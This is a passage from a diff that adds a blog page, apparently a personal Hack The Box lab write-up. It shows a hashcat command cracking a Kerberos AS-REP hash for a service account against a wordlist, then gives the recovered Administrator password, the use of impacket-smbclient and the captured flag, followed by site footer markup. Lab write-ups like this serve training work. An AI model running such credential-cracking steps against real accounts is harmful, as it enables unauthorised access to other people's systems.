3adca05369d5442a47f007e20e3b84b54b82851de9aab7172dfc252c3099dd064a77f9297d71ceac0493fdd3b468d1ab4d941f221e4e7ab7a1270cf779819099119bd0098cbb67b626609f319291df069f7b8be2cfeb485354328cb7228bf645937da99e965bbd1f099361</code></pre>
+</div>
+</details></li><li>Cracking hash with hashcat</li></ol>
+
+<pre><code>.\hashcat.exe -m18200 '$krb5asrep$23$svc-alfresco@HTB.LOCAL:cf12865740fba98999d477e6e619806b$4d31ccdcb297a96c72be6b6dcb123b5a8b42beece692a23d13b42240ecf74589868f3879936ae1a0a26a9ad7e136133793a4383d600ba1d9611e93337abd555d487f952ac0d9291dbde2af43d9ecd1cde93d6d479cd08aa0031730813e63f3f5a4e65df28d12dab758c1d54a6ab9e86867e93d81435d03a38f663927f11e3f2c2a2fc55cf8aafa5a4b03750b3e754095aa491501a43d1a3356c311aafdbab1cae68facebde180dba1e127e4af5994af3f53eb1e86a6260094d845b9ddc4f81b02e2ae2c53b44339dc3d4d5e8a31580b484dadcf9699734a0bf0606bcbb6104df247b4daf818c' -a 3 ..\rockyou.txt --force --potfile-disable</code></pre>
+
+<p>→ <strong>Administrator</strong>:<mark class="highlight-red" data-notion-highlight="red">Ticketmaster1968</mark></p>
+
+<ul><li>using impacket-smbclient I was able to get the final flag → <strong><mark class="highlight-teal" data-notion-highlight="teal">a55fc1c353d99d55e1ad0fb506a7b772</mark></strong></li></ul>
+
+
+                </article>
+
+                <aside class="toc">
+                    <p class="toc-k">Contents</p>
+                    <ul id="toc-list"></ul>
+                </aside>
+            </div>
+        </main>
+
+        <footer class="site-foot">
+            <div class="foot-in">
+                <p class="copy">© <span data-year></span> Frédéric Goossens · <span class="credit">vibe coded</span></p>
+                <div class="socials">
+                    <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+                    <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div class="scroll-hint" data-scroll-hint aria-hidden="true"></div>
+    <script src="../assets/js/site.js?v=66"></script>
+</body>
+</html>
